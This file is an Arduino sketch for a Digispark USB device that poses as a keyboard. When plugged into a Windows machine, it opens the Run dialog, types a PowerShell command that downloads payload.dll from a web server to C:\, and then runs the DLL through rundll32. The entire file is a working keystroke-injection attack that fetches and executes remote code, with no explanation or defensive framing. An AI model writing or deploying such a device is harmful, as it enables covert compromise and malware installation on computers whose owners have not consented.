#include <digi_tr_tr.h>
#include "DigiKeyboard.h"

void setup() {
}

void loop() {

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("powershell \"(New-Object Net.WebClient).DownloadFile('https://mywebserver/payload.dll', 'C:\\payload.dll')\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000); 
  
  DigiKeyboard.print("powershell \"Start-Process cmd.exe -ArgumentList '/c rundll32.exe payload.dll,calc.exe'\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  exit(0);
}
